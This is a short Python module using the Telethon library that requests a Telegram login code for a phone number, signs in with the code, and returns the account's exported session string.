from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from config import API_ID, API_HASH

clients = {}

async def send_code(phone):
    session = StringSession()
    client = TelegramClient(session, API_ID, API_HASH)
    await client.connect()
    await client.send_code_request(phone)
    clients[phone] = client
    return

async def verify_code(phone, code):
    client = clients.get(phone)
    if not client:
        return "Session expired. Please try again."
    try:
        await client.sign_in(phone, code)
        session_str = client.session.save()
        await client.disconnect()
        return session_str
    except Exception as e:
        return f"❌ Error: {str(e)}"
